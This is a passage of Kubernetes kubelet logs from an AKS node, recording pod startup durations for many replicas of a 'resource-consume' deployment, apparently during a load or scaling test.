aks-userpool0-13101832-vmss000000 kubelet[3277]: I0321 03:13:28.898224    3277 pod_startup_latency_tracker.go:104] \"Observed pod startup duration\" pod=\"default/resource-consume-5d695b7459-xs8sk\" podStartSLOduration=-9223372022.956581 podStartE2EDuration=\"13.898195433s\" podCreationTimestamp=\"2025-03-21 03:13:15 +0000 UTC\" firstStartedPulling=\"2025-03-21 03:13:15.694494656 +0000 UTC m=+1030.033348261\" lastFinishedPulling=\"0001-01-01 00:00:00 +0000 UTC\" observedRunningTime=\"2025-03-21 03:13:28.896313215 +0000 UTC m=+1043.235166920\" watchObservedRunningTime=\"2025-03-21 03:13:28.898195433 +0000 UTC m=+1043.237049138\"\nMar 21 03:13:28 aks-userpool0-13101832-vmss000000 kubelet[3277]: I0321 03:13:28.914117    3277 pod_startup_latency_tracker.go:104] \"Observed pod startup duration\" pod=\"default/resource-consume-5d695b7459-qzbg4\" podStartSLOduration=-9223372022.940683 podStartE2EDuration=\"13.914092986s\" podCreationTimestamp=\"2025-03-21 03:13:15 +0000 UTC\" firstStartedPulling=\"2025-03-21 03:13:15.764081004 +0000 UTC m=+1030.102934709\" lastFinishedPulling=\"0001-01-01 00:00:00 +0000 UTC\" observedRunningTime=\"2025-03-21 03:13:28.912589371 +0000 UTC m=+1043.251443076\" watchObservedRunningTime=\"2025-03-21 03:13:28.914092986 +0000 UTC m=+1043.252946691\"\nMar 21 03:13:29 aks-userpool0-13101832-vmss000000 kubelet[3277]: I0321 03:13:29.743375    3277 pod_startup_latency_tracker.go:104] \"Observed pod startup duration\" pod=\"default/resource-consume-5d695b7459-9v968\" podStartSLOduration=-9223372022.111412 podStartE2EDuration=\"14.743363516s\" podCreationTimestamp=\"2025-03-21 03:13:15 +0000 UTC\" firstStartedPulling=\"2025-03-21 03:13:16.232346464 +0000 UTC m=+1030.571200069\" lastFinishedPulling=\"0001-01-01 00:00:00 +0000 UTC\" observedRunningTime=\"2025-03-21 03:13:29.743138614 +0000 UTC m=+1044.081992219\" watchObservedRunningTime=\"2025-03-21 03:13:29.743363516 +0000 UTC m=+1044.082217221\"\nMar 21 03:13:29 aks-userpool0-13101832-vmss000000 kubelet[3277]: I0321 03:13:29.777476    3277 pod_startup_latency_tracker.go:104] \"Observed pod startup duration\" pod=\"default/resource-consume-5d695b7459-s5hjm\" podStartSLOduration=-9223372022.077312 podStartE2EDuration=\"14.777464228s\" podCreationTimestamp=\"2025-03-21 03:13:15 +0000 UTC\" firstStartedPulling=\"2025-03-21 03:13:16.193046798 +0000 UTC m=+1030.531900403\" lastFinishedPulling=\"0001-01-01 00:00:00 +0000 UTC\" observedRunningTime=\"2025-03-21 03:13:29.762203088 +0000 UTC m=+1044.101056693\" watchObservedRunningTime=\"2025-03-21 03:13:29.777464228 +0000 UTC m=+1044.116317833\"\nMar 21 03:13:29 aks-userpool0-13101832-vmss000000 kubelet[3277]: I0321 03:13:29.791363    3277 pod_startup_latency_tracker.go:104] \"Observed pod startup duration\" pod=\"default/resource-consume-5d695b7459-qmrw7\" podStartSLOduration=-9223372022.063433 podStartE2EDuration=\"14.791342954s\" podCreationTimestamp=\"2025-03-21 03:13:15 +0000 UTC\" firstStartedPulling=\"2025-03-21 03:13:16.737999772 +0000 UTC m=+1031.076853377\" lastFinishedPulling=\"0001-01-01 00:00:00 +0000 UTC\" observedRunningTime=\"2025-03-21 03:13:29.791239654 +0000 UTC m=+1044.130093259\" watchObservedRunningTime=\"2025-03-21 03:13:29.791342954 +0000 UTC m=+1044.130196559\"\nMar 21 03:13:29 aks-userpool0-13101832-vmss000000 kubelet[3277]: I0321 03:13:29.809451    3277 pod_startup_latency_tracker.go:104] \"Observed pod startup duration\" pod=\"default/resource-consume-5d695b7459-98zcf\" podStartSLOduration=-9223372022.04535 podStartE2EDuration=\"14.80942682s\" podCreationTimestamp=\"2025-03-21 03:13:15 +0000 UTC\" firstStartedPulling=\"2025-03-21 03:13:15.774925805 +0000 UTC m=+1030.113779410\" lastFinishedPulling=\"0001-01-01 00:00:00 +0000 UTC\" observedRunningTime=\"2025-03-21 03:13:29.806957097 +0000 UTC m=+1044.145810802\" watchObservedRunningTime=\"2025-03-21 03:13:29.80942682 +0000 UTC m=+1044.148280525\"\nMar 21 03:13:29 aks-userpool0-13101832-vmss000000 kubelet[3277]: I0321 03:13:29.845589    3277 pod_startup_latency_tracker.go:104] \"Observed pod startup duration\" pod=\"default/resource-consume-5d695b7459-pgqjn\" podStartSLOduration=-9223372022.009212 podStartE2EDuration=\"14.84556425s\" podCreationTimestamp=\"2025-03-21 03:13:15 +0000 UTC\" firstStartedPulling=\"2025-03-21 03:13:16.218133332 +0000 UTC m=+1030.556986937\" lastFinishedPulling=\"0001-01-01 00:00:00 +0000 UTC\" observedRunningTime=\"2025-03-21 03:13:29.826599777 +0000 UTC m=+1044.165453382\" watchObservedRunningTime=\"2025-03-21 03:13:29.84556425 +0000 UTC m=+1044.184417955\"\nMar 21 03:13:29 aks-userpool0-13101832-vmss000000 kubelet[3277]: I0321 03:13:29.846234    3277 pod_startup_latency_tracker.go:104] \"Observed pod startup duration\" pod=\"default/resource-consume-5d695b7459-lmzcq\" podStartSLOduration=-9223372022.008556 podStartE2EDuration=\"14.846219956s\" podCreationTimestamp=\"2025-03-21 03:13:15 +0000 UTC\" firstStartedPulling=\"2025-03-21 03:13:16.738373576 +0000 UTC m=+1031.077227181\" lastFinishedPulling=\"0001-01-01 00:00:00 +0000 UTC\" observedRunningTime=\"2025-03-21 03:13:29.844299739 +0000 UTC m=+1044.183153344\" watchObservedRunningTime=\"2025-03-21 03:13:29.846219956 +0000 UTC m=+1044.185073661\"\nMar 21 03:13:29 aks-userpool0-13101832-vmss000000 kubelet[3277]: I0321 03:13:29.893156    3277 pod_startup_latency_tracker.go:104] \"Observed pod startup duration\" pod=\"default/resource-consume-5d695b7459-ll5ws\" podStartSLOduration=-9223372021.961643 podStartE2EDuration=\"14.893132285s\" podCreationTimestamp=\"2025-03-21 03:13:15 +0000 UTC\" firstStartedPulling=\"2025-03-21 03:13:16.296088457 +0000 UTC m=+1030.634942062\" lastFinishedPulling=\"0001-01-01 00:00:00 +0000 UTC\" observedRunningTime=\"2025-03-21 03:13:29.877643344 +0000 UTC m=+1044.216496949\" watchObservedRunningTime=\"2025-03-21 03:13:29.893132285 +0000 UTC m=+1044.231985990\"\nMar 21 03:13:29 aks-userpool0-13101832-vmss000000 kubelet[3277]: I0321 03:13:29.893887    3277 pod_startup_latency_tracker.go:104] \"Observed pod startup duration\" pod=\"default/resource-consume-5d695b7459-pzkl4\" podStartSLOduration=-9223372021.960901 podStartE2EDuration=\"14.893874392s\" podCreationTimestamp=\"2025-03-21 03:13:15 +0000 UTC\" firstStartedPulling=\"2025-03-21 03:13:15.903561902 +0000 UTC m=+1030.242415507\" lastFinishedPulling=\"0001-01-01 00:00:00 +0000 UTC\" observedRunningTime=\"2025-03-21 03:13:29.892696481 +0000 UTC m=+1044.231550086\" watchObservedRunningTime=\"2025-03-21 03:13:29.893874392 +0000 UTC m=+1044.232728097\"\nMar 21 03:13:29 aks-userpool0-13101832-vmss000000 kubelet[3277]: I0321 03:13:29.931560    3277 pod_startup_latency_tracker.go:104] \"Observed pod startup duration\" pod=\"default/resource-consume-5d695b7459-t4r8t\" podStartSLOduration=-9223372021.923231 podStartE2EDuration=\"14.931545337s\" podCreationTimestamp=\"2025-03-21 03:13:15 +0000 UTC\" firstStartedPulling=\"2025-03-21 03:13:15.763787601 +0000 UTC m=+1030.102641206\" lastFinishedPulling=\"0001-01-01 00:00:00 +0000 UTC\" observedRunningTime=\"2025-03-21 03:13:29.931120333 +0000 UTC m=+1044.269974038\" watchObservedRunningTime=\"2025-03-21 03:13:29.931545337 +0000 UTC m=+1044.270398942\"\nMar 21 03:13:29 aks-userpool0-13101832-vmss000000 kubelet[3277]: I0321 03:13:29.931915    3277 pod_startup_latency_tracker.go:104] \"Observed pod startup duration\" pod=\"default/resource-consume-5d695b7459-blksv\" podStartSLOduration=-9223372021.922865 podStartE2EDuration=\"14.93191044s\" podCreationTimestamp=\"2025-03-21 03:13:15 +0000 UTC\" firstStartedPulling=\"2025-03-21 03:13:16.498044538 +0000 UTC m=+1030.836898143\" lastFinishedPulling=\"0001-01-01 00:00:00 +0000 UTC\" observedRunningTime=\"2025-03-21 03:13:29.91336167 +0000 UTC m=+1044.252215275\" watchObservedRunningTime=\"2025-03-21 03:13:29.93191044 +0000 UTC m=+1044.270764145\"\nMar 21 03:13:29 aks-userpool0-13101832-vmss000000 kubelet[3277]: I0321 03:13:29.944643    3277 pod_startup_latency_tracker.go:104] \"Observed pod startup duration\" pod=\"default/resource-consume-5d695b7459-xh8th\" podStartSLOduration=-9223372021.910145 podStartE2EDuration=\"14.944631156s\" podCreationTimestamp=\"2025-03-21 03:13:15 +0000 UTC\" firstStartedPulling=\"2025-03-21 03:13:16.279809706 +0000 UTC m=+1030.618663311\" lastFinishedPulling=\"0001-01-01 00:00:00 +0000 UTC\" observedRunningTime=\"2025-03-21 03:13:29.944586456 +0000 UTC m=+1044.283440161\" watchObservedRunningTime=\"2025-03-21 03:13:29.944631156 +0000 UTC m=+1044.283484761\"\nMar 21 03:13:29 aks-userpool0-13101832-vmss000000 kubelet[3277]: I0321 03:13:29.968652    3277 pod_startup_latency_tracker.go:104] \"Observed pod startup duration\" pod=\"default/resource-consume-5d695b7459-8m27p\" podStartSLOduration=-9223372021.886139 podStartE2EDuration=\"14.968636476s\" podCreationTimestamp=\"2025-03-21 03:13:15 +0000 UTC\" firstStartedPulling=\"2025-03-21 03:13:15.656439101 +0000 UTC m=+1029.995292706\" lastFinishedPulling=\"0001-01-01 00:00:00 +0000 UTC\" observedRunningTime=\"2025-03-21 03:13:29.968195372 +0000 UTC m=+1044.307048977\" watchObservedRunningTime=\"2025-03-21 03:13:29.968636476 +0000 UTC m=+1044.307490181\"\nMar 21 03:13:29 aks-userpool0-13101832-vmss000000 kubelet[3277]: I0321 03:13:29.985168    3277 pod_startup_latency_tracker.go:104] \"Observed pod startup duration\" pod=\"default/resource-consume-5d695b7459-t2x84\" podStartSLOduration=-9223372021.86962 podStartE2EDuration=\"14.985156427s\" podCreationTimestamp=\"2025-03-21 03:13:15 +0000 UTC\" firstStartedPulling=\"2025-03-21 03:13:16.222334871 +0000 UTC m=+1030.561188476\" lastFinishedPulling=\"0001-01-01 00:00:00 +0000 UTC\" observedRunningTime=\"2025-03-21 03:13:29.982606003 +0000 UTC m=+1044.321459708\" watchObservedRunningTime=\"2025-03-21 03:13:29.985156427 +0000 UTC m=+1044.324010032\"\nMar 21 03:13:30 aks-userpool0-13101832-vmss000000 kubelet[3277]: I0321 03:13:30.012837    3277 pod_startup_latency_tracker.go:104] \"Observed pod startup duration\" pod=\"default/resource-consume-5d695b7459-7c65s\" podStartSLOduration=-9223372021.841953 podStartE2EDuration=\"15.01282288s\" podCreationTimestamp=\"2025-03-21 03:13:15 +0000 UTC\" firstStartedPulling=\"2025-03-21 03:13:16.093637872 +0000 UTC m=+1030.432491477\" lastFinishedPulling=\"0001-01-01 00:00:00 +0000 UTC\" observedRunningTime=\"2025-03-21 03:13:29.996999635 +0000 UTC m=+1044.335853340\" watchObservedRunningTime=\"2025-03-21 03:13:30.01282288 +0000 UTC m=+1044.351676485\"\nMar 21 03:13:30 aks-userpool0-13101832-vmss000000 kubelet[3277]: I0321 03:13:30.012948    3277 pod_startup_latency_tracker.go:104] \"Observed pod startup duration\" pod=\"default/resource-consume-5d695b7459-zrwh7\" podStartSLOduration=-9223372021.841831 podStartE2EDuration=\"15.012943781s\" podCreationTimestamp=\"2025-03-21 03:13:15 +0000 UTC\" firstStartedPulling=\"2025-03-21 03:13:15.904088907 +0000 UTC m=+1030.242942512\" lastFinishedPulling=\"0001-01-01 00:00:00 +0000 UTC\" observedRunningTime=\"2025-03-21 03:13:30.011905271 +0000 UTC m=+1044.350758976\" watchObservedRunningTime=\"2025-03-21 03:13:30.012943781 +0000 UTC m=+1044.351797386\"\nMar 21 03:13:30 aks-userpool0-13101832-vmss000000 kubelet[3277]: I0321 03:13:30.034890    3277 pod_startup_latency_tracker.go:104] \"Observed pod startup duration\" pod=\"default/resource-consume-5d695b7459-dfq58\" podStartSLOduration=-9223372021.819899 podStartE2EDuration=\"15.034877981s\" podCreationTimestamp=\"2025-03-21 03:13:15 +0000 UTC\" firstStartedPulling=\"2025-03-21 03:13:16.193641703 +0000 UTC m=+1030.532495308\" lastFinishedPulling=\"0001-01-01 00:00:00 +0000 UTC\" observedRunningTime=\"2025-03-21 03:13:30.03467058 +0000 UTC m=+1044.373524185\" watchObservedRunningTime=\"2025-03-21 03:13:30.034877981 +0000 UTC m=+1044.373731586\"\nMar 21 03:13:30 aks-userpool0-13101832-vmss000000 kubelet[3277]: I0321 03:13:30.066197    3277 pod_startup_latency_tracker.go:104] \"Observed pod startup duration\" pod=\"default/resource-consume-5d695b7459-2g5b8\" podStartSLOduration=-9223372021.788593 podStartE2EDuration=\"15.066181968s\" podCreationTimestamp=\"2025-03-21 03:13:15 +0000 UTC\" firstStartedPulling=\"2025-03-21 03:13:15.698267191 +0000 UTC m=+1030.037120796\" lastFinishedPulling=\"0001-01-01 00:00:00 +0000 UTC\" observedRunningTime=\"2025-03-21 03:13:30.065916965 +0000 UTC m=+1044.404770570\" watchObservedRunningTime=\"2025-03-21 03:13:30.066181968 +0000 UTC m=+1044.405035673\"\nMar 21 03:13:30 aks-userpool0-13101832-vmss000000 kubelet[3277]: I0321 03:13:30.087932    3277 pod_startup_latency_tracker.go:104] \"Observed pod startup duration\" pod=\"default/resource-consume-5d695b7459-2h2zw\" podStartSLOduration=-9223372021.766863 podStartE2EDuration=\"15.087912466s\" podCreationTimestamp=\"2025-03-21 03:13:15 +0000 UTC\" firstStartedPulling=\"2025-03-21 03:13:16.295999857 +0000 UTC m=+1030.634853562\" lastFinishedPulling=\"0001-01-01 00:00:00 +0000 UTC\" observedRunningTime=\"2025-03-21 03:13:30.085933148 +0000 UTC m=+1044.424786853\" watchObservedRunningTime=\"2025-03-21 03:13:30.087912466 +0000 UTC m=+1044.426766071\"\nMar 21 03:13:30 aks-userpool0-13101832-vmss000000 kubelet[3277]: I0321 03:13:30.137266    3277 pod_startup_latency_tracker.go:104] \"Observed pod startup duration\" pod=\"default/resource-consume-5d695b7459-srw4q\" podStartSLOduration=-9223372021.717527 podStartE2EDuration=\"15.137247518s\" podCreationTimestamp=\"2025-03-21 03:13:15 +0000 UTC\" firstStartedPulling=\"2025-03-21 03:13:15.902810795 +0000 UTC m=+1030.241664400\" lastFinishedPulling=\"0001-01-01 00:00:00 +0000 UTC\" observedRunningTime=\"2025-03-21 03:13:30.135858905 +0000 UTC m=+1044.474712510\" watchObservedRunningTime=\"2025-03-21 03:13:30.137247518 +0000 UTC m=+1044.476101123\"\nMar 21 03:13:30 aks-userpool0-13101832-vmss000000 kubelet[3277]: I0321 03:13:30.197793    3277 pod_startup_latency_tracker.go:104] \"Observed pod startup duration\" pod=\"default/resource-consume-5d695b7459-fxv2t\" podStartSLOduration=-9223372021.657 podStartE2EDuration=\"15.197776671s\" podCreationTimestamp=\"2025-03-21 03:13:15 +0000 UTC\" firstStartedPulling=\"2025-03-21 03:13:15.656919906 +0000 UTC m=+1029.995773611\" lastFinishedPulling=\"0001-01-01 00:00:00 +0000 UTC\" observedRunningTime=\"2025-03-21 03:13:30.196484559 +0000 UTC m=+1044.535338264\" watchObservedRunningTime=\"2025-03-21 03:13:30.197776671 +0000 UTC m=+1044.536630276\"\nMar 21 03:13:30 aks-userpool0-13101832-vmss000000 kubelet[3277]: I0321 03:13:30.281975    3277 pod_startup_latency_tracker.go:104] \"Observed pod startup duration\" pod=\"default/resource-consume-5d695b7459-22gt8\" podStartSLOduration=-9223372021.572819 podStartE2EDuration=\"15.281956141s\" podCreationTimestamp=\"2025-03-21 03:13:15 +0000 UTC\" firstStartedPulling=\"2025-03-21 03:13:15.692153034 +0000 UTC m=+1030.031006639\" lastFinishedPulling=\"0001-01-01 00:00:00 +0000 UTC\" observedRunningTime=\"2025-03-21 03:13:30.266712901 +0000 UTC m=+1044.605566506\" watchObservedRunningTime=\"2025-03-21 03:13:30.281956141 +0000 UTC m=+1044.620809846\"\nMar 21 03:13:30 aks-userpool0-13101832-vmss000000 kubelet[3277]: I0321 03:13:30.310947    3277 pod_startup_latency_tracker.go:104] \"Observed pod startup duration\" pod=\"default/resource-consume-5d695b7459-xbcgj\" podStartSLOduration=-9223372021.543846 podStartE2EDuration=\"15.310929706s\" podCreationTimestamp=\"2025-03-21 03:13:15 +0000 UTC\" firstStartedPulling=\"2025-03-21 03:13:15.692563638 +0000 UTC m=+1030.031417343\" lastFinishedPulling=\"0001-01-01 00:00:00 +0000 UTC\" observedRunningTime=\"2025-03-21 03:13:30.309458392 +0000 UTC m=+1044.648311997\" watchObservedRunningTime=\"2025-03-21 03:13:30.310929706 +0000 UTC m=+1044.649783311\"\nMar 21 03:13:30 aks-userpool0-13101832-vmss000000 kubelet[3277]: I0321 03:13:30.764309    3277 pod_startup_latency_tracker.go:104] \"Observed pod startup duration\" pod=\"default/resource-consume-5d695b7459-cccxt\" podStartSLOduration=-9223372021.090485 podStartE2EDuration=\"15.764292052s\" podCreationTimestamp=\"2025-03-21 03:13:15 +0000 UTC\" firstStartedPulling=\"2025-03-21 03:13:16.726583166 +0000 UTC m=+1031.065436771\" lastFinishedPulling=\"0001-01-01 00:00:00 +0000 UTC\" observedRunningTime=\"2025-03-21 03:13:30.413234541 +0000 UTC m=+1044.752088246\" watchObservedRunningTime=\"2025-03-21 03:13:30.764292052 +0000 UTC m=+1045.103145757\"\nMar 21 03:13:30 aks-userpool0-13101832-vmss000000 kubelet[3277]: I0321 03:13:30.894602    3277 pod_startup_latency_tracker.go:104] \"Observed pod startup duration\" pod=\"default/resource-consume-5d695b7459-65s72\" podStartSLOduration=-9223372020.96019 podStartE2EDuration=\"15.894585743s\" podCreationTimestamp=\"2025-03-21 03:13:15 +0000 UTC\" firstStartedPulling=\"2025-03-21 03:13:16.191949788 +0000 UTC m=+1030.530803393\" lastFinishedPulling=\"0001-01-01 00:00:00 +0000 UTC\" observedRunningTime=\"2025-03-21 03:13:30.892216021 +0000 UTC m=+1045.231069626\" watchObservedRunningTime=\"2025-03-21 03:13:30.894585743 +0000 UTC m=+1045.233439348\"\nMar 21 03:13:30 aks-userpool0-13101832-vmss000000 kubelet[3277]: I0321 03:13:30.912226    3277 pod_startup_latency_tracker.go:104] \"Observed pod startup duration\" pod=\"default/resource-consume-5d695b7459-m7hr4\" podStartSLOduration=-9223372020.942568 podStartE2EDuration=\"15.912208704s\" podCreationTimestamp=\"2025-03-21 03:13:15 +0000 UTC\" firstStartedPulling=\"2025-03-21 03:13:16.566271673 +0000 UTC m=+1030.905125278\" lastFinishedPulling=\"0001-01-01 00:00:00 +0000 UTC\" observedRunningTime=\"2025-03-21 03:13:30.909087876 +0000 UTC m=+1045.247941481\" watchObservedRunningTime=\"2025-03-21 03:13:30.912208704 +0000 UTC m=+1045.251062309\"\nMar 21 03:13:30 aks-userpool0-13101832-vmss000000 kubelet[3277]: I0321 03:13:30.942281    3277 pod_startup_latency_tracker.go:104] \"Observed pod startup duration\" pod=\"default/resource-consume-5d695b7459-6h8jn\" podStartSLOduration=-9223372020.91251 podStartE2EDuration=\"15.942265179s\" podCreationTimestamp=\"2025-03-21 03:13:15 +0000 UTC\" firstStartedPulling=\"2025-03-21 03:13:16.309327181 +0000 UTC m=+1030.648180786\" lastFinishedPulling=\"0001-01-01 00:00:00 +0000 UTC\" observedRunningTime=\"2025-03-21 03:13:30.941991177 +0000 UTC m=+1045.280844882\" watchObservedRunningTime=\"2025-03-21 03:13:30.942265179 +0000 UTC m=+1045.281118784\"\nMar 21 03:13:30 aks-userpool0-13101832-vmss000000 kubelet[3277]: I0321 03:13:30.956458    3277 pod_startup_latency_tracker.go:104] \"Observed pod startup duration\" pod=\"default/resource-consume-5d695b7459-s9ww8\" podStartSLOduration=-9223372020.89833 podStartE2EDuration=\"15.956444509s\" podCreationTimestamp=\"2025-03-21 03:13:15 +0000 UTC\" firstStartedPulling=\"2025-03-21 03:13:16.276795078 +0000 UTC m=+1030.615648783\" lastFinishedPulling=\"0001-01-01 00:00:00 +0000 UTC\" observedRunningTime=\"2025-03-21 03:13:30.955703802 +0000 UTC m=+1045.294557507\" watchObservedRunningTime=\"2025-03-21 03:13:30.956444509 +0000 UTC m=+1045.295298214\"\nMar 21 03:13:30 aks-userpool0-13101832-vmss000000 kubelet[3277]: I0321 03:13:30.971561    3277 pod_startup_latency_tracker.go:104] \"Observed pod startup duration\" pod=\"default/resource-consume-5d695b7459-2rf6j\" podStartSLOduration=-9223372020.883226 podStartE2EDuration=\"15.971549247s\" podCreationTimestamp=\"2025-03-21 03:13:15 +0000 UTC\" firstStartedPulling=\"2025-03-21 03:13:15.697739286 +0000 UTC m=+1030.036592991\" lastFinishedPulling=\"0001-01-01 00:00:00 +0000 UTC\" observedRunningTime=\"2025-03-21 03:13:30.971382545 +0000 UTC m=+1045.310236250\" watchObservedRunningTime=\"2025-03-21 03:13:30.971549247 +0000 UTC m=+1045.310402952\"\nMar 21 03:13:31 aks-userpool0-13101832-vmss000000 kubelet[3277]: I0321 03:13:31.006484    3277 pod_startup_latency_tracker.go:104] \"Observed pod startup duration\" pod=\"default/resource-consume-5d695b7459-7nzwf\" podStartSLOduration=-9223372020.848307 podStartE2EDuration=\"16.006468566s\" podCreationTimestamp=\"2025-03-21 03:13:15 +0000 UTC\" firstStartedPulling=\"2025-03-21 03:13:16.536324494 +0000 UTC m=+1030.875178099\" lastFinishedPulling=\"0001-01-01 00:00:00 +0000 UTC\" observedRunningTime=\"2025-03-21 03:13:30.990319618 +0000 UTC m=+1045.329173323\" watchObservedRunningTime=\"2025-03-21 03:13:31.006468566 +0000 UTC m=+1045.345322171\"\nMar 21 03:13:31 aks-userpool0-13101832-vmss000000 kubelet[3277]: I0321 03:13:31.044637    3277 pod_startup_latency_tracker.go:104] \"Observed pod startup duration\" pod=\"default/resource-consume-5d695b7459-92db7\" podStartSLOduration=-9223372020.810158 podStartE2EDuration=\"16.044617515s\" podCreationTimestamp=\"2025-03-21 03:13:15 +0000 UTC\" firstStartedPulling=\"2025-03-21 03:13:16.61752435 +0000 UTC m=+1030.956377955\" lastFinishedPulling=\"0001-01-01 00:00:00 +0000 UTC\" observedRunningTime=\"2025-03-21 03:13:31.043922609 +0000 UTC m=+1045.382776214\" watchObservedRunningTime=\"2025-03-21 03:13:31.044617515 +0000 UTC m=+1045.383471220\"\nMar 21 03:13:31 aks-userpool0-13101832-vmss000000 kubelet[3277]: I0321 03:13:31.060221    3277 pod_startup_latency_tracker.go:104] \"Observed pod startup duration\" pod=\"default/resource-consume-5d695b7459-8v8z6\" podStartSLOduration=-9223372020.794569 podStartE2EDuration=\"16.060206358s\" podCreationTimestamp=\"2025-03-21 03:13:15 +0000 UTC\" firstStartedPulling=\"2025-03-21 03:13:15.662466657 +0000 UTC m=+1030.001320262\" lastFinishedPulling=\"0001-01-01 00:00:00 +0000 UTC\" observedRunningTime=\"2025-03-21 03:13:31.058875745 +0000 UTC m=+1045.397729350\" watchObservedRunningTime=\"2025-03-21 03:13:31.060206358 +0000 UTC m=+1045.399059963\"\nMar 21 03:13:31 aks-userpool0-13101832-vmss000000 kubelet[3277]: I0321 03:13:31.074283    3277 pod_startup_latency_tracker.go:104] \"Observed pod startup duration\" pod=\"default/resource-consume-5d695b7459-ztjl5\" podStartSLOduration=-9223372020.780506 podStartE2EDuration=\"16.074269786s\" podCreationTimestamp=\"2025-03-21 03:13:15 +0000 UTC\" firstStartedPulling=\"2025-03-21 03:13:15.967671799 +0000 UTC m=+1030.306525504\" lastFinishedPulling=\"0001-01-01 00:00:00 +0000 UTC\" observedRunningTime=\"2025-03-21 03:13:31.073344278 +0000 UTC m=+1045.412197883\" watchObservedRunningTime=\"2025-03-21 03:13:31.074269786 +0000 UTC m=+1045.413123391\"\nMar 21 03:13:31 aks-userpool0-13101832-vmss000000 kubelet[3277]: I0321 03:13:31.106010    3277 pod_startup_latency_tracker.go:104] \"Observed pod startup duration\" pod=\"default/resource-consume-5d695b7459-pwh6k\" podStartSLOduration=-9223372020.74878 podStartE2EDuration=\"16.105996076s\" podCreationTimestamp=\"2025-03-21 03:13:15 +0000 UTC\" firstStartedPulling=\"2025-03-21 03:13:16.069850351 +0000 UTC m=+1030.408703956\" lastFinishedPulling=\"0001-01-01 00:00:00 +0000 UTC\" observedRunningTime=\"2025-03-21 03:13:31.104874166 +0000 UTC m=+1045.443727771\" watchObservedRunningTime=\"2025-03-21 03:13:31.105996076 +0000 UTC m=+1045.444849681\"\nMar 21 03:13:31 aks-userpool0-13101832-vmss000000 kubelet[3277]: I0321 03:13:31.135053    3277 pod_startup_latency_tracker.go:104] \"Observed pod startup duration\" pod=\"default/resource-consume-5d695b7459-8bf59\" podStartSLOduration=-9223372020.719736 podStartE2EDuration=\"16.135039342s\" podCreationTimestamp=\"2025-03-21 03:13:15 +0000 UTC\" firstStartedPulling=\"2025-03-21 03:13:16.623636207 +0000 UTC m=+1030.962489812\" lastFinishedPulling=\"0001-01-01 00:00:00 +0000 UTC\" observedRunningTime=\"2025-03-21 03:13:31.119238297 +0000 UTC m=+1045.458092002\" watchObservedRunningTime=\"2025-03-21 03:13:31.135039342 +0000 UTC m=+1045.473892947\"\nMar 21 03:13:31 aks-userpool0-13101832-vmss000000 kubelet[3277]: I0321 03:13:31.135812    3277 pod_startup_latency_tracker.go:104] \"Observed pod startup duration\" pod=\"default/resource-consume-5d695b7459-295jz\" podStartSLOduration=-9223372020.718971 podStartE2EDuration=\"16.135804949s\" podCreationTimestamp=\"2025-03-21 03:13:15 +0000 UTC\" firstStartedPulling=\"2025-03-21 03:13:15.906392929 +0000 UTC m=+1030.245246534\" lastFinishedPulling=\"0001-01-01 00:00:00 +0000 UTC\" observedRunningTime=\"2025-03-21 03:13:31.135294244 +0000 UTC m=+1045.474147849\" watchObservedRunningTime=\"2025-03-21 03:13:31.135804949 +0000 UTC m=+1045.474658554\"\nMar 21 03:13:31 aks-userpool0-13101832-vmss000000 kubelet[3277]: I0321 03:13:31.168498    3277 pod_startup_latency_tracker.go:104] \"Observed pod startup duration\" pod=\"default/resource-consume-5d695b7459-lck4j\" podStartSLOduration=-9223372020.68629 podStartE2EDuration=\"16.168485848s\" podCreationTimestamp=\"2025-03-21 03:13:15 +0000 UTC\" firstStartedPulling=\"2025-03-21 03:13:16.106208589 +0000 UTC m=+1030.445062294\" lastFinishedPulling=\"0001-01-01 00:00:00 +0000 UTC\" observedRunningTime=\"2025-03-21 03:13:31.167876942 +0000 UTC m=+1045.506730547\" watchObservedRunningTime=\"2025-03-21 03:13:31.168485848 +0000 UTC m=+1045.507339453\"\nMar 21 03:13:31 aks-userpool0-13101832-vmss000000 kubelet[3277]: I0321 03:13:31.185334    3277 pod_startup_latency_tracker.go:104] \"Observed pod startup duration\" pod=\"default/resource-consume-5d695b7459-hfplg\" podStartSLOduration=-9223372020.669456 podStartE2EDuration=\"16.185318802s\" podCreationTimestamp=\"2025-03-21 03:13:15 +0000 UTC\" firstStartedPulling=\"2025-03-21 03:13:16.284343048 +0000 UTC m=+1030.623196753\" lastFinishedPulling=\"0001-01-01 00:00:00 +0000 UTC\" observedRunningTime=\"2025-03-21 03:13:31.183683787 +0000 UTC m=+1045.522537392\" watchObservedRunningTime=\"2025-03-21 03:13:31.185318802 +0000 UTC m=+1045.524172407\"\nMar 21 03:13:31 aks-userpool0-13101832-vmss000000 kubelet[3277]: I0321 03:13:31.214894    3277 pod_startup_latency_tracker.go:104] \"Observed pod startup duration\" pod=\"default/resource-consume-5d695b7459-d6shl\" podStartSLOduration=-9223372020.639896 podStartE2EDuration=\"16.214879072s\" podCreationTimestamp=\"2025-03-21 03:13:15 +0000 UTC\" firstStartedPulling=\"2025-03-21 03:13:15.797997019 +0000 UTC m=+1030.136850724\" lastFinishedPulling=\"0001-01-01 00:00:00 +0000 UTC\" observedRunningTime=\"2025-03-21 03:13:31.213978964 +0000 UTC m=+1045.552832569\" watchObservedRunningTime=\"2025-03-21 03:13:31.214879072 +0000 UTC m=+1045.553732777\"\nMar 21 03:13:31 aks-userpool0-13101832-vmss000000 kubelet[3277]: I0321 03:13:31.834527    3277 pod_startup_latency_tracker.go:104] \"Observed pod startup duration\" pod=\"default/resource-consume-5d695b7459-l8fnq\" podStartSLOduration=-9223372020.020267 podStartE2EDuration=\"16.834507738s\" podCreationTimestamp=\"2025-03-21 03:13:15 +0000 UTC\" firstStartedPulling=\"2025-03-21 03:13:16.097986813 +0000 UTC m=+1030.436840418\" lastFinishedPulling=\"0001-01-01 00:00:00 +0000 UTC\" observedRunningTime=\"2025-03-21 03:13:31.833314927 +0000 UTC m=+1046.172168632\" watchObservedRunningTime=\"2025-03-21 03:13:31.834507738 +0000 UTC m=+1046.173361443\"\nMar 21 03:13:31 aks-userpool0-13101832-vmss000000 kubelet[3277]: I0321 03:13:31.851955    3277 pod_startup_latency_tracker.go:104] \"Observed pod startup duration\" pod=\"default/resource-consume-5d695b7459-f5zxf\" podStartSLOduration=-9223372020.002844 podStartE2EDuration=\"16.851931597s\" podCreationTimestamp=\"2025-03-21 03:13:15 +0000 UTC\" firstStartedPulling=\"2025-03-21 03:13:16.312154907 +0000 UTC m=+1030.651008512\" lastFinishedPulling=\"0001-01-01 00:00:00 +0000 UTC\" observedRunningTime=\"2025-03-21 03:13:31.850246582 +0000 UTC m=+1046.189100187\" watchObservedRunningTime=\"2025-03-21 03:13:31.851931597 +0000 UTC 